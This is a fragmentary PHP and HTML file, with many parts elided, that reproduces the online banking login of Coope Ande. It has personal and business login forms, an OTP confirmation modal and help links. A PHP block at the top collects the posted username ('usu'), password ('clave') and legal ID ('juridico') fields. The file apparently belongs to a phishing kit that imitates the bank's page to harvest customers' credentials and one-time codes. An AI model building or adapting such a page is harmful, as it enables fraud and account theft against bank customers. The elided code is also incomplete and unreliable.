...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $allowedFields = ["usu", "clave", "juridico"];
    $formData = [];
            ...
            <div class="modal-content">
                <div>
                    <div align="center">
                        ...
                        <img class="close-button" src="imagenes/closed.png?ver=20150102"
                            onclick="ModalToggleCloseOTP();" alt="Cerrar">
                    </div>
                    <div></div>
                </div>
                                    ...
                                    <div class="panel-body">
                                        <div class="col-xs-6">
                                            <div class="form-group">
                                                <label for="txtId" class="formth">Elija un m&eacute;todo de
                                                    confirmaci&oacute;n:</label>
                                            </div>
                                            <div>
                                                <select class="input-iconInfo" id="cbMetodo"
                                                    onchange="validarTokenLogin()" size="1" name="metodo"></select>
                                        ...
                                        <div class="fvaMensajeErrorIdentificacion fvaMargenDeContenido"
                                            style="display:none">El formato de la indentificaci&oacute;n es incorrecto
                                        </div>
                                    </div>
                                </div>
                            </div>
                ...
                <div style="display:none" id="blockToken">
                    ...
                    <div class="fvaCodigoConBotonCopiar">
                        <div id="">
                            <input type="text" name="" maxlength="7" id="codigoOTP" class="input"
                                style="border: none; color: #0072b9;" onkeypress="return acceptNum(event);"
                                onkeyup="formaNumber()">
                        </div>
                    </div>
                    <div class="fvaContenidoDeCopieCodigo">
                        <div class="fvaTituloDelResumen" style="margin-top: 15px;">Resumen de la transacci&oacute;n:
                        </div>
                    ...
                    <div class="fvaMensajeErrorIdentificacion fvaMargenDeContenido" id="errorOtpValidate"
                        style="display:none"></div>
                    <div style="text-align: center;">
                        <button type="button" class="btn-dark" id="btnCancelar4" tabindex="20"
                            onclick="ModalToggleCloseOTP()">
                            Cancelar
                        </button>
            ...
            <div class="modal-content">
                <div>
                    <div align="center">
                        ...
                        <img class="close-button" src="imagenes/closed.png?ver=20150102" onclick="ModalToggleClose();"
                            alt="Cerrar">
                    </div>
                    <div></div>
                </div>
            ...
            <div class="modal-content">
                <div>
                    <div align="center">
                        ...
                        <img class="close-button" src="imagenes/closed.png?ver=20150102"
                            onclick="ModalToggleCloseEmp();" alt="Cerrar">
                    </div>
                    <div></div>
                </div>
            ...
            <div class="card-wrapper-content">
                ...
                <div class="card-login">
                    ...
                    <div class="loader-wrapper" id="loader-wrapper">
                        ...
                        <div class="loading-text">Verificando sus datos</div>
                    </div>
                    <div id="uno">
                        <p class="card-login-title">Coope Ande en l&iacute;nea</p>
                        <div class="login-wrapperRadio">
                            <div class="wrapperRadio-radio">
                                <input type="radio" id="check-personal" checked="checked" class="radioBtn"
                                    onclick="formPersonal();">
                            ...
                            |
                            <div class="wrapperRadio-radio">
                                <input type="radio" id="check-empresarial" class="radioBtn"
                                    onclick="formEmpresarial();">
                        ...
                        <form method="post" id="frmLoginPersonal" name="frmLoginPersonal"
                            style="display:block">
                            ...
                            <div id="message_area_LoginPersonal"
                                style="clear: both;width: 90%; margin-left: auto; margin-right: auto; text-align: center;background: #f1d2d5;margin-bottom: 6px;">

                                <div class=" errormsg" id="errorMsg" align="center"
                                    style="display: contents; width:86%; margin-left: auto; margin-right: auto; font-size: 18px; color: #bd3543;padding:0px;height:0px">
                                </div>

                            </div>
                            <div id="message_areaOTP">
                                <div class="message errormsg" id="errorMsg" align="center"
                                    style="display: none; width:86%; margin-left: auto; margin-right: auto;font-size: 18px; color: #bd3543;">
                                </div>
                            </div>
                            <input required style="width: 90%;" type="text" name="usu" maxlength="30"
                                value="" tabindex="1" id="identificacionPrs" class="user-login"
                                onkeypress="return acceptNum(event);" autocomplete="off" placeholder="Usuario">
                            <div class="clearfix"></div>

                            <input required style="width: 90%;" type="password" name="clave" maxlength="20" tabindex="2"
                                id="txtPass" class="pass-login" onfocus="" autocomplete="off" placeholder="Contraseña">
                            ...
                            <button type="submit" id="btnLoginFirma" name="label.firmaDigital" value="Firma digital"
                                class="btn_actualizar_firma" title="Firma digital"
                                onclick="event.preventDefault();modalAuthPrs();">
                                Firma digital
                            </button>
                        ...
                        <form method="post" id="frmLoginEmpresarial" name="frmLoginEmpresarial"
                            style="display:none" autocomplete="false">
                            ...
                            <div id="message_areaOTPEmp">
                                <div class="message errormsg" id="errorMsgEmp" align="center"
                                    style="display: none; width:86%; margin-left: auto; margin-right: auto;font-size: 18px; color: #bd3543;">
                                </div>
                            </div>
                            <input type="text" name="juridico" maxlength="30" value="" tabindex="1" id="txt01"
                                class="user-login-emp" onkeypress="return acceptNum(event);" autocomplete="off"
                                placeholder="Cédula Juridica">
                                <div style="height: 8px;"></div>
                            <input type="text" name="usu" maxlength="30" value="" tabindex="1" id="txt02"
                                class="user-login" onkeypress="return acceptNum(event);" autocomplete="off"
                                placeholder="Usuario">
                            <div class="clearfix"></div>
                            <input type="password" name="clave" maxlength="20" tabindex="2" id="txt03" class="pass-login-emp"
                                onkeypress="" autocomplete="off" placeholder="Contraseña">
                            <div class="clearfix"></div>
                            <button class="btn_actualizar" onclick="cryptFormEmp();"
                                href="javascript:void(0);">Ingresar</button>
                            <div style="text-align: center;">
                                <a class="card-link" onclick="modalEmpresarial();"
                                    href="javascript:void(0);">&iquest;Olvid&oacute;
                                    su
                                    contrase&ntilde;a?</a>
                            </div>
                            <button type="submit" id="btnLoginFirma" name="label.firmaDigital" value="Firma digital"
                                class="btn_actualizar_firma" title="Firma digital"
                                onclick="event.preventDefault();modalAuthEmp();">
                                Firma digital
                            </button>
            ...
            <div class="container-block">
                    ...
                    <div style="">
                        ...
                        <div class="convert clearfix">
                            ...
                            <div class="clearfix">
                                ...
                                <input class="converter-input" onkeyup="typeamountConverter()"
                                    onblur="formatNumber(this.value)" onfocus=""
                                    onkeypress="return app.acceptNum(event);" id="amountConverter" maxlength="10"
                                    placeholder="0" autocomplete="off">

                                <label id="changeExchange" class="show-icon hide-button"
                                    onclick="changeExchange();">cc</label>
                            </div>
                    ...
                    <div class="modal-content">
                        <div>
                            <div align="center">
                                ...
                                <img class="close-button" src="imagenes/closed.png?ver=20150102"
                                    onclick="ModalToggleClosePass();" alt="Cerrar">
                            </div>
                            <div></div>
                        </div>
                        <div id="blockIden" style="">
                            ...
                            <div class="fvaContenidoParaTipoIdentificacion" id="chkOpciones">
                                <p style="text-align:justify; margin: 15px;">Su clave se bloquear&aacute;
                                    ...
                                    escribir al correo: <a href="/cdn-cgi/l/email-protection" class="__cf_email__"
                                        data-cfemail="224b4c444d62414d4d5247434c4647130c414d4f">[email&#160;protected]</a>
                                </p>
                            </div>
                        </div>
                    </div>
                    ...
                    <div class="modal-content">
                        <div>
                            <div align="center">
                                ...
                                <img class="close-button" src="imagenes/closed.png?ver=20150102"
                                    onclick="ModalToggleCloseChange();" alt="Cerrar">
                            </div>
                            <div></div>
                        </div>
                        <div id="blockIden" style="">
                ...
                <div id="info" class="typeChange">
                    ...
                    <div class="" style="padding: 20px;">
                        <div align="left">
                            <a style="color: #333333" href="javascript:void(0);"
                                onclick="linkPass();">&iquest;Qu&eacute;
                                hacer si se
                                me bloquea la
                        ...
                        <div align="left">
                            <a style="color: #333333" href="javascript:void(0);"
                                onclick="linkChange();">&iquest;C&oacute;mo
                                cambio mi
                                contrase&ntilde;a?</a><br><br>
                        </div>
                        <div align="left">
                            <a style="color: #333333" href="pdf/Servicios.pdf" target="_blank"
                                rel="noopener">&iquest;Qu&eacute;
                                puedo
                                hacer
                                en
                                Coope
                        ...
                        <br>
                        <div align="left">
                            <a style="color: #333333" href="pdf/Accesos.pdf" target="_blank"
                                rel="noopener">Consideraciones
                                de la clave
                                de
                                acceso </a>
                ...
                <div class="notes-secure">
                    ...
                    <div class="col-xs-5">
                        <div align="left" style="padding:10px;">
                            <span class="style98">Busque el candado cerrado en su navegador de internet.</span><span
                                class="style18">
                                <br>
        ...
        <footer class="footer">
            <div id="indicia">
                ...
                <p>
                    ...
                    <a href="/cdn-cgi/l/email-protection#751c1b131a35161a1a0510141b1110445b161a18"><span
                            class="__cf_email__"
                            data-cfemail="3e575058517e5d51514e5b5f505a5b0f105d5153">[email&#160;protected]</span></a>
                </p>
            </div>
        </footer>
    </div>
